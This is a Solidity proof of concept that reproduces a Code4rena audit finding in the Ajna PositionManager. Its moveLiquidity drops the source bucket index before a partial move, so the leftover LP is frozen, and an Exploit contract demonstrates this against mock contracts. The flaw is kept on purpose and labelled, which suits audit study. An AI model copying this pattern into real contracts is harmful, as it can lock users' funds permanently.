// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ajna Protocol — PositionManager's moveLiquidity can freeze funds by
    removing the fromIndex even when the move was partial
    (Code4rena 2023-05-ajna, [H-01], finding #20069, reporter hyh)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: moveLiquidity always does positionIndex.remove(fromIndex)
    BEFORE the pool's moveQuoteToken, even when available quote deposit is
    less than the LP-implied max — so fromPosition.lps remains > 0 after a
    partial move but the index is gone from positionIndexes. Redeem / further
    moves on that residual LP are then impossible: permanent fund freeze.

    Vulnerable lines preserved VERBATIM (@> VULN). No fork, no cheats.
//////////////////////////////////////////////////////////////////////////*/

library EnumerableSet {
    struct UintSet {
        uint256[] _values;
        mapping(uint256 => uint256) _indexes;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        if (set._indexes[value] != 0) return false;
        set._values.push(value);
        set._indexes[value] = set._values.length;
        return true;
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex == 0) return false;
        uint256 toDeleteIndex = valueIndex - 1;
        uint256 lastIndex = set._values.length - 1;
        if (toDeleteIndex != lastIndex) {
            uint256 lastValue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastValue;
            set._indexes[lastValue] = valueIndex;
        }
        set._values.pop();
        delete set._indexes[value];
        return true;
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return set._values.length;
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return set._indexes[value] != 0;
    }
}

struct Position {
    uint256 lps;
    uint256 depositTime;
}

struct MoveLiquidityParams {
    uint256 tokenId;
    address pool;
    uint256 fromIndex;
    uint256 toIndex;
    uint256 expiry;
}

/// @notice Reduced Ajna pool. moveQuoteToken can return a PARTIAL lpbAmountFrom
///         when quote deposit is the binding constraint (the finding's scenario).
contract MockPool {
    struct Bucket {
        uint256 bucketLP;
        uint256 bucketCollateral;
        uint256 bankruptcyTime;
        uint256 bucketDeposit; // available quote that can be moved
    }

    mapping(uint256 => Bucket) internal _buckets;
    // index => lender => LP balance in the pool itself
    mapping(uint256 => mapping(address => uint256)) public lenderLP;

    function setBucket(
        uint256 index,
        uint256 bucketLP,
        uint256 bucketCollateral,
        uint256 bankruptcyTime,
        uint256 bucketDeposit
    ) external {
        _buckets[index] = Bucket(bucketLP, bucketCollateral, bankruptcyTime, bucketDeposit);
    }

    function setLenderLP(uint256 index, address lender, uint256 amount) external {
        lenderLP[index][lender] = amount;
    }

    function updateInterest() external {}

    function bucketInfo(uint256 index)
        external
        view
        returns (uint256 bucketLP, uint256 bucketCollateral, uint256 bankruptcyTime, uint256 bucketDeposit, uint256)
    {
        Bucket storage b = _buckets[index];
        return (b.bucketLP, b.bucketCollateral, b.bankruptcyTime, b.bucketDeposit, 0);
    }

    /// @dev Partial-move model: redeems only min(maxQuote, deposit) of quote,
    ///      and only the corresponding share of LP. Remaining LP stays at fromIndex.
    function moveQuoteToken(uint256 maxQuote, uint256 fromIndex, uint256 toIndex, uint256 /*expiry*/)
        external
        returns (uint256 lpbAmountFrom, uint256 lpbAmountTo)
    {
        Bucket storage fromB = _buckets[fromIndex];
        uint256 movable = maxQuote < fromB.bucketDeposit ? maxQuote : fromB.bucketDeposit;
        // 1:1 LP:quote for the synthetic (rate = 1e18 wmul identity)
        lpbAmountFrom = movable;
        lpbAmountTo = movable;

        require(lenderLP[fromIndex][msg.sender] >= lpbAmountFrom, "pool LP");
        lenderLP[fromIndex][msg.sender] -= lpbAmountFrom;
        lenderLP[toIndex][msg.sender] += lpbAmountTo;
        fromB.bucketDeposit -= movable;
        fromB.bucketLP = fromB.bucketLP > lpbAmountFrom ? fromB.bucketLP - lpbAmountFrom : 0;
        _buckets[toIndex].bucketLP += lpbAmountTo;
        _buckets[toIndex].bucketDeposit += movable;
    }
}

/// @notice Reduced PositionManager with moveLiquidity body from
///         code-423n4/2023-05-ajna commit 276942b PositionManager.sol L262-L323
///         (remove-fromIndex + partial LP update preserved).
contract PositionManager {
    using EnumerableSet for EnumerableSet.UintSet;

    error RemovePositionFailed();
    error BucketBankrupt();
    error NoAuth();
    error WrongPool();
    error ResidualFrozen();

    mapping(uint256 => address) public poolKey;
    mapping(uint256 => mapping(uint256 => Position)) internal positions;
    mapping(uint256 => EnumerableSet.UintSet) internal positionIndexes;

    mapping(uint256 => address) internal _owners;
    uint256 internal _nextId = 1;

    function ownerOf(uint256 tokenId_) public view returns (address) {
        address o = _owners[tokenId_];
        require(o != address(0), "not minted");
        return o;
    }

    function mint(address pool_, address recipient_) external returns (uint256 tokenId_) {
        tokenId_ = _nextId++;
        _owners[tokenId_] = recipient_;
        poolKey[tokenId_] = pool_;
    }

    /// @dev Seed a memorialized position (test/setup helper).
    function seedPosition(uint256 tokenId_, uint256 index, uint256 lps, uint256 depositTime) external {
        positions[tokenId_][index] = Position({lps: lps, depositTime: depositTime});
        positionIndexes[tokenId_].add(index);
    }

    function getPosition(uint256 tokenId_, uint256 index) external view returns (uint256 lps, uint256 depositTime) {
        Position storage p = positions[tokenId_][index];
        return (p.lps, p.depositTime);
    }

    function hasIndex(uint256 tokenId_, uint256 index) external view returns (bool) {
        return positionIndexes[tokenId_].contains(index);
    }

    function getPositionIndexesLength(uint256 tokenId_) external view returns (uint256) {
        return positionIndexes[tokenId_].length();
    }

    /// @dev Minimal _lpToQuoteToken: rate = 1 when bucketLP == deposit (identity),
    ///      capped by deposit (the finding's binding liquidity constraint).
    function _lpToQuoteToken(
        uint256 /*bucketLP*/,
        uint256 /*bucketCollateral*/,
        uint256 deposit,
        uint256 lenderLPBalance,
        uint256 maxQuoteToken,
        uint256 /*bucketPrice*/
    ) internal pure returns (uint256 quoteTokenAmount) {
        // 1:1 rate for the synthetic
        quoteTokenAmount = lenderLPBalance;
        if (quoteTokenAmount > deposit) quoteTokenAmount = deposit;
        if (quoteTokenAmount > maxQuoteToken) quoteTokenAmount = maxQuoteToken;
    }

    modifier mayInteract(address pool_, uint256 tokenId_) {
        require(_owners[tokenId_] != address(0), "not minted");
        require(msg.sender == _owners[tokenId_], "NoAuth");
        require(pool_ == poolKey[tokenId_], "WrongPool");
        _;
    }

    /// @notice Verbatim structure of PositionManager.moveLiquidity (partial freeze bug).
    function moveLiquidity(MoveLiquidityParams calldata params_)
        external
        mayInteract(params_.pool, params_.tokenId)
    {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];
        uint256 depositTime = fromPosition.depositTime;
        if (depositTime == 0) revert RemovePositionFailed();

        MockPool pool = MockPool(params_.pool);
        pool.updateInterest();

        // retrieve deposit + bankruptcy (rate identity: skip full _lpToQuoteToken stack)
        (,,, uint256 bucketDeposit,) = pool.bucketInfo(params_.fromIndex);
        (,, uint256 bankruptcyTime,,) = pool.bucketInfo(params_.fromIndex);
        if (depositTime <= bankruptcyTime) revert BucketBankrupt();

        // max quote = min(lps, deposit) at 1:1 rate
        uint256 maxQuote = fromPosition.lps;
        if (maxQuote > bucketDeposit) maxQuote = bucketDeposit;

        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        // remove bucket index from which liquidity is moved from tracked positions
        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed(); // @> VULN: removes fromIndex BEFORE move, even when move will be partial and residual LP remains
        // FIX: only remove after move if residual fromPosition.lps is dust/zero.

        positionIndex.add(params_.toIndex);

        (uint256 lpbAmountFrom, uint256 lpbAmountTo) =
            pool.moveQuoteToken(maxQuote, params_.fromIndex, params_.toIndex, params_.expiry);

        // update position LP state
        fromPosition.lps -= lpbAmountFrom; // residual can remain > 0 while index already removed — frozen
        positions[params_.tokenId][params_.toIndex].lps += lpbAmountTo;
        positions[params_.tokenId][params_.toIndex].depositTime = depositTime;
    }

    /// @dev Attempt to redeem residual at an index that was dropped from the set —
    ///      mirrors the real path that requires the index to still be tracked.
    function redeemResidual(uint256 tokenId_, uint256 index) external view returns (uint256) {
        if (!positionIndexes[tokenId_].contains(index)) revert ResidualFrozen();
        return positions[tokenId_][index].lps;
    }
}

/// @notice End-to-end exploit: partial move freezes residual LP at fromIndex.
/// CREATE order: pool (1), pm (2).
contract Exploit {
    MockPool public pool;
    PositionManager public pm;
    uint256 public tokenId;

    uint256 public constant FROM = 1000;
    uint256 public constant TO = 2000;
    uint256 public constant TOTAL_LP = 100 ether;
    uint256 public constant DEPOSIT_AVAILABLE = 40 ether; // binding constraint < TOTAL_LP

    uint256 public residualLps;
    bool public fromIndexDropped;
    bool public redeemFrozen;
    uint256 public movedToLps;

    constructor() {
        pool = new MockPool(); // CREATE nonce 1
        pm = new PositionManager(); // CREATE nonce 2

        // Bucket with mixed quote+collateral effect: only 40e18 quote available
        // while lender holds 100e18 LP (rate 1:1) → partial move of 40.
        pool.setBucket(FROM, TOTAL_LP, 1 ether /*collateral*/, 0 /*bankruptcy*/, DEPOSIT_AVAILABLE);
        pool.setBucket(TO, 0, 0, 0, 0);
        pool.setLenderLP(FROM, address(pm), TOTAL_LP); // PM holds the memorialized LP in the pool

        tokenId = pm.mint(address(pool), address(this));
        pm.seedPosition(tokenId, FROM, TOTAL_LP, 1); // depositTime = 1 > bankruptcy 0
    }

    function run() external {
        require(pm.hasIndex(tokenId, FROM), "pre: from tracked");
        (uint256 lpsBefore,) = pm.getPosition(tokenId, FROM);
        require(lpsBefore == TOTAL_LP, "pre: full LP");

        MoveLiquidityParams memory p = MoveLiquidityParams({
            tokenId: tokenId,
            pool: address(pool),
            fromIndex: FROM,
            toIndex: TO,
            expiry: type(uint256).max
        });
        pm.moveLiquidity(p);

        (residualLps,) = pm.getPosition(tokenId, FROM);
        (movedToLps,) = pm.getPosition(tokenId, TO);
        fromIndexDropped = !pm.hasIndex(tokenId, FROM);

        // HARM: residual LP remains at fromIndex but the index is no longer tracked.
        require(residualLps == TOTAL_LP - DEPOSIT_AVAILABLE, "partial residual");
        require(movedToLps == DEPOSIT_AVAILABLE, "moved amount");
        require(fromIndexDropped, "fromIndex should be removed");
        require(pm.hasIndex(tokenId, TO), "toIndex should be tracked");

        // Any further management of the residual is impossible — frozen funds.
        redeemFrozen = false;
        try pm.redeemResidual(tokenId, FROM) {
            redeemFrozen = false;
        } catch {
            redeemFrozen = true;
        }
        require(redeemFrozen, "residual must be unredeemable");
        require(residualLps > 0 && fromIndexDropped && redeemFrozen, "harm not demonstrated");
    }
}
